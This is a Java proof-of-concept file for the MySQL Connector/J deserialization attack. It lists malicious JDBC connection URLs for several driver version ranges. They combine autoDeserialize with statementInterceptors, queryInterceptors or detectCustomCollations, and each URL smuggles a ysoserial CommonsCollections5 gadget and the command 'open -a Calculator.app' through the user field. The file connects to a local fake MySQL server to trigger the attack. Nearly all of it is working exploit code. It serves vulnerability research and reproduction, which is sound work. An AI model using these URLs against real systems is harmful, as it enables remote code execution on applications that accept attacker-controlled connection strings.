package org.example;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

/**
 * 反序列化
 * mysql https://mvnrepository.com/artifact/mysql/mysql-connector-java
 * 复现使用 https://github.com/fnmsd/MySQL_Fake_Server
 *
 * @author Whoopsunix
 */
public class SerializeAttack {
    public static void main(String[] args) throws Exception {
        /**
         * [5.1.1, 5.1.10]
         * 使用 statementInterceptors 参数
         * 需要通过 查询调用
         */
//        String serializeAttackUrl_5_1_10 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";
//        String username = "yso_CommonsCollections5_open -a Calculator.app";
//        String password = "";
//        Class.forName("com.mysql.jdbc.Driver");
//        Connection con = DriverManager.getConnection(serializeAttackUrl_5_1_10, username, password);
//        String sql = "select database()";
//        PreparedStatement ps = con.prepareStatement(sql);
//        ResultSet resultSet = ps.executeQuery();


        /**
         * [5.1.11, 5.1.48]
         * 使用 statementInterceptors 参数
         */
        String serializeAttackUrl_5_11_48 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";

        /**
         * [5.1.19, 5.1.28]
         */
        String serializeAttackUrl_5_19_28 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&autoDeserialize=true&user=yso_CommonsCollections5_open -a Calculator.app";

        /**
         * [5.1.29, 5.1.40]
         * detectCustomCollations 触发
         */
        String serializeAttackUrl_5_29_40 = "jdbc:mysql://127.0.0.1:3306/test?maxAllowedPacket=655360&detectCustomCollations=true&autoDeserialize=true&user=yso_CommonsCollections5_open -a Calculator.app";

        /**
         * [6.0.2, 6.0.6]
         * statementInterceptors
         */
        String serializeAttackUrl_6 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";

        /**
         * [8.0.7-dmr,8.0.19]
         * statementInterceptors
         */
        String serializeAttackUrl_8_7_19 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";


        // 低版本需要加载
//        String driver = "com.mysql.jdbc.Driver";
//        Class.forName(driver);

        Connection connection = DriverManager.getConnection(serializeAttackUrl_8_7_19);

    }

}
